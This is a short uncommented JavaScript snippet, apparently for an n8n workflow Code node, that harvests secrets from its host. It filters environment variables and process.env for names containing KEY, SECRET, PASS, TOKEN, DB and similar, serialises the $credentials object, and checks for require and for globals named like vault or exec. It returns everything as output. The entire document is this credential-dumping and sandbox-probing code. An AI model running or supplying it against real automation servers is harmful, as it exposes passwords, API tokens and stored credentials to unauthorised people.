const out={};
function t(f){try{return f()}catch(e){return 'ERR:'+String(e).slice(0,200)}}
out.env = t(()=> typeof $env!=='undefined' ? JSON.stringify(Object.fromEntries(Object.entries($env).filter(([k])=>/N8N|KEY|SECRET|PASS|PG|DB|TOKEN/i.test(k)))) : 'no $env');
out.creds = t(()=> typeof $credentials!=='undefined' ? JSON.stringify($credentials) : 'no $credentials');
out.process = t(()=> typeof process!=='undefined' ? JSON.stringify(Object.fromEntries(Object.entries(process.env).filter(([k])=>/N8N|KEY|SECRET|PASS|PG|DB|TOKEN/i.test(k)))) : 'no process');
out.require = t(()=> typeof require!=='undefined' ? 'require yes' : 'no require');
out.globals = t(()=> Object.keys(globalThis).filter(k=>/cred|vault|exec|proc/i.test(k)).join(','));
return [{json:out}];
